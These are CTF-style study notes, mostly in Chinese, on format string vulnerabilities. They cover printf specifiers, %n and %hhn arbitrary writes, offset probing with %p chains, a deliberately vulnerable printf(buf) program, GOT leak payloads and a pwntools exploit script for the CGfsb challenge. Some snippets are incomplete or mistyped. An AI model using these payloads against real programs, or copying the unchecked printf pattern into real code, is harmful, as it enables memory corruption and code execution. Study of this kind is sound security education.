
### fmt/format/printf/格式化字符串

https://www.cplusplus.com/reference/cstdio/printf/

| param | Desc                                                                                                          |
| ----- | ------------------------------------------------------------------------------------------------------------- |
| %d    | 十进制 - 输出十进制整数                                                                                       |
| %x    | 十六进制 - 输出十六进制数                                                                                     |
| %s    | 字符串 - 从内存中读取字符串                                                                                   |
| %c    | 字符 - 输出字符                                                                                               |
| %p    | 指针 - 指针地址                                                                                               |
| %n    | 四字节 到目前为止所写的字符数,%n 这个格式化字符串，它的功能是将%n 之前打印出来的字符个数，赋值给一个变量，例如这样： |
|       | 可以理解成 %n 是对变量赋值, 值为长度数                                                                        |
|       | %?$n 向栈内第?个指向的 地址处写入字符串长度。                                                                 |
|       | 比如栈内第 2 个值为 0x40056a, %85c%2$n，就是向地址 0x40056a 写入 85                                           |
| %hhn  | 输出一个字节                                                                                                  |
| %hn   | 输出一个双字节                                                                                                |

aaaa%p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
x64: aaaa%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x

[64 位格式化字符串漏洞修改 got 表利用详解](https://www.anquanke.com/post/id/194458?display=mobile)

aaaa%p %p %p %p %p %p %p(第 7 个)
aaaa0x8048 2 3 4 5 6 0x41414141
%p.%p.%p.%p.%p.%p.%p.%p.%p

%p 是 0x8048000
%x 是 8048000

'%31$x' 任意读 -> leak libc, PIE, Heap, Stack: bypass ASLR
'%31$n' 任意写

payload = fmtstr_payload(7, {addr: 16}) # 向 addr 写入 16
payload = flat(addr, 'a'\*12, b'%7$n') # 向 addr 写入 16, addr 占 4, 4+12=16

- 原理
- 格式化字符串
- 程序崩溃
- 泄漏内存
- 泄漏栈内存
- 泄漏任意地址内存：覆盖小数字、覆盖大数字
- 例题 1：x64 格式化字符串漏洞
- 例题 2：hijack GOT 劫持 GOT 表
- 例题 3：hijack retaddr 劫持返回地址
- 盲打

https://blog.csdn.net/qq_42880719/article/details/119060634

- Format string attack

- Read - information leak:
  - PIE, stack heap libc ASLR, cannary
- Write - almost write every where
- Powerful vulnerablility

往后进行 overflow, 覆盖到 rbp

```c
int printf( const char* format, ...);
int fprintf( FILE* stream, const char* format, ...);
int vprintf( const char* format, va_list arg);
int vfprintf( const char* format, va_list arg);
int vprintf( const char* format, va_list arg);
int vprintf( FILE *stream, const char* format, va_list arg);
int vdprintf( int fd, const char* format, va_list ap);
```

正面这个即使保护全开也能拿到 shell

```c
int main() {
    char buf[0x100];

    while(scanf("%s", buf) != EOF) {
        printf(buf);
        printf("\n");
    }
    return 0;
}
```

### printf

[Link](https://blog.csdn.net/qinying001/article/details/98527949) 可以理解成 %n 是对变量赋值, 值为长度数

```c
printf("test %n",   &var); // [var为4个字节]
printf("test %hn",  &var); // [var为2个字节]
printf("test %hhn", &var); // [var为1个字节]
```

具体原理：当 printf 在输出格式化字符串的时候，会维护一个内部指针，当 printf 逐步将格式化字符串的字符打印到
屏幕，当遇到%的时候，printf 会期望它后面跟着一个格式字符串，因此会递增内部字符串以抓取格式控制符的输入值。
这就是问题所在，printf 无法知道栈上是否放置了正确数量的变量供它操作，如果没有足够的变量可供操作，而指针按正
常情况下递增，就会产生越界访问。甚至由于%n 的问题，可导致任意地址读写。

```c
#include <stdio.h>

int main(int argc, char const *argv[])
{
    int a = 0;
    printf("Hello world%n", &a);
    printf("%d\n", a);
    return 0;
    // Hello world11, a的值被改变了, gcc编译下。
}
```

任意内存读取

```c
#include <stdio.h>
int (){
        char str[100];
        scanf("%s",str);
        printf(str);
}
```

任意内存写入

```
printf("addr%m$n",&arg);
在addr地址的第m个参数写入4个字节(addr)的数据，arg=4
```

%85c%7$n ，作用是将 85 写入栈内第 7 个参数所指向的地址。

在 printf 中，使用 `*<a_number_of_chars>%<number>$n*` 就可以将相应的第 `*<number>*` 个参数的位置写为 % 前输出的字符数量

如本题先用 %85c 输出了 85 个字符，再用 %7$n 将第七个参数的位置写成了 85

#### $的作用

Linux 下, x$指栈第x个参数的地址, 下面2$指第 2 个地址, $1 指第一个地址. 即输出 2, 3

```c
    int a = 3, b = 2;
    printf("%2$d %1$d", a, b);
```

#### 示例 CGfsb

通常 2 次输入

    1.1111
    2.输入 aaaa-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
    aaaa-ffffd22e-f7fb4580-00000001-00000000-00000001-f7ffd940-31310001-000a3131-00000000-61616161-3830252d-30252d78
    ***1-*******2-*******3-*******4-*******5-*******6-*******7-*******8-*******9-******10-*'1111'*

偏移是 10, 拖动调试。第二次 printf 处下断点。

    payload = flat(p32(0x0804A068), 'a'*4 ,'%10$n')
    send(payload)后

x/16wx $esp # 查看栈情况

    fff2a488 fff2a47e f7f47580 00000001 00000000 00000001 f7f90940 61610001 000a6161 00000000 0804a068 61616161
    ******01 ******02 ******03 ******04 ******05 ******06 ******07 ******08 ******09 ******10 ******11 ***aaaa*

exp:

```python
from pwn import *
context.log_level = 'debug'
conn = process('./e41a0f684d0e497f87bb309f91737e4d')
# conn = remote("220.249.52.133",56225)
pwnme =
payload1 = 'aaaa'
payload2 = flat(p32(pwnme), 'a'*4 ,'%10$n')  #pwnme地址占4个字节，所以后面需要打印4个a
conn.recvuntil('please tell me your name:')
conn.sendline(payload1)
# gdb.attach(conn)
conn.recvuntil('leave your message please:')
conn.sendline(payload2)
conn.interactive()
print(conn.recvall())
```

#### 参数说明

- type
- d/i，有符号整数
  - u，无符号整数
  - x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
  - s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
  - c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
  - p， void \* 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。
  - n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
  - %， '%'字面值，不接受任何 flags, width。

#### x64 fmt - axb_2019_fmt64

会被\x00 截断，要先填充 8 个字节。再+地址 ，举例： leak 出来偏移 8 个地址，那么偏移 8 开始 payload(8Bytes), 地址在第 9 位偏移(8Bytes)

"%9$sAAAA" + p64(puts_got)

```sh
[DEBUG] Sent 0x11 bytes:
    00000000  25 39 24 73  41 41 41 41  18 10 60 00  00 00 00 00  │%9$s│AAAA│··`·│····│
```

#### fmt - read

- int printf( const char\* format, ...);

- rdi, rsi, rdx, rcx, r8, r9, STACK
  - x64 calling convention
  - rdi, rsi, rdx, r10, r8, r9, (push to stack) for system call
  - return value is stored in rax
- rdi -> fmt
- %d, %p, %s, %c, %x -> read data on the stack
- information leak

x64 正常参数是按顺序放 rdi, rsi, rdx, rcx, r8, r9, STACK 的。

实际输入 %x%x 就只是把 format 放到 rdi，那么就会直接读出 stack 上面的内容。就把 stack leak 出来。

能控 formatstring, 从第 6 个开始就可以从 stack 上一直读了。register 内容读完就是 stack 的值了

pintf(buf);
​```c
input: "aaaaaaa"
output: "aaaaaaa"

input: "%p.%p.%p"
output: "0x7fbdb0e858b0, 0x1, 0x3"
rdi rsi rdx

input: "%3$p"
output: "0x3"

input: "%p.%p.%p.%p.%p.%p.%p.%p.%p"
output: "0x7fbdb0e858b0, 0x1, 0x7ffff7dd48b0, 0x555555554846.0x4.0x7052e7052e7025.0x252e70252e70252e"
rdi rsi rdx rcx r8 r9 stack

已进入 main 函数了 -8 对齐
x/64gx $rsp-8

````
BambooFox-2018-2019年合集-107学年社课 (P2. 程式安全-pwn2)

#### fmt - write
123456%n78%n, &c, &d // n前面是6个字符 c=6 , d前面8个字符 d=8

%n   --- 一次写入4个字节
%hn  --- 一次写入2个字节
%hhn --- 一次写入1个字节

偏移是7的, 将0x08048010地址修改为50
\x10\x80\x04\x08%46c%7$n

将已输出之字元数目当成interger值（4bytes），写入address。

e.g
​```c
// fmt_write.c
int main()
{
    int a=0;
    printf("a = %d\n", a);
    printf("123abc%d\n", a);
    // printf("%100c%d\n", 0, a);
    printf("a = %d\n", a); //a = 6
    return 0;
}
````

printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%n", &ptr)

printf("%100c%n", &char, &ptr)

printf("%100c%n", 0, &ptr)

```c
// fmt_write.c
int main()
{
    int a=0;
    printf("a = %d\n", a);
    printf("%100c%d\n", 0, a);
    printf("a = %d\n", a); //a=100
    return 0;
}
```

16 进制显示
`./fmt_write.c | xxd `

大量写入不稳定，需要 sleep 等一下。或使用又下的方法

- %100c%n -> 写入 4bytes \x64\x00\x00\x00
- %100c%hn -> 写入 2bytes \x64\x00\
- %100c%hhn -> 写入 1bytes \x64

```
%10$hhn%11$hhn%12$hhn%13$hhn  => 0x10101010
```

任意地址写 - 和任意地址读的方法一样不过我们把‰5 换成了%n

```
n：一次写入4个字节
hn：一次写入2个字节
%hn：一次写入1个字节
```

但是‰n 修改内容最大的缺点就是：我们要将数值修改为多少，就要输入多少长度的数据
比如同样偏移是 7，但是我们需要将 0x08048010 地址的内容修改为 50，那么我们这样写：

`\x10\x80\x04\x08%46c%7$n`

但是我们需要将 0×08048010 地址的内容修改为 0×10203040，那么我们是不是需要输入 0x10203040 个字符串呢？

```
\x00\x80\x04\x08
\x01\x80\x04\x08
\x03\x80\x04\x08
\x03\x80\x04\x08
%48c%7$hhn
%240c%8$hhn
%240c%9$hhn
%240c%10$hhn
```

#### fmt - exploit

- If format string is stored on the stack：

  - 将 address 放置放 payload，得知 address 位於第 n 個参数，用%n$去 refenrence 它。

- %nSp->leak libc，PIE，Heap，Stack:bypass ASLR

- %n$n->write value

- read &write everywhere

如果 fomrat string 在 stack 上。那可以把 address 放在 format string 上。 用%s leak, format sting 后面+个 8bytes 的 printf 的 GOT。再算好 address 位置。

%100c%n%100c%n
第一个%n 会写 100，第二个%n 会写 200，只能从小往大排列好再写。

pwn_02_fmt_write.py

當 format string 不在 stack 上，如位於 global.bss

無法利用 fmt payload 來放 address

尋找 stack 上有利残留值

pointer， address

- libc text

- stack

通常找到的 address 固定，只能往同個地方寫，但希望能拆開寫

·希望找到一個 stack address ，其指向之地方又是 stack address 。

·利用第一個 address 來改寫第二個 address ，用第二個 address 來建構真的要的 address。

√ RBP Chain
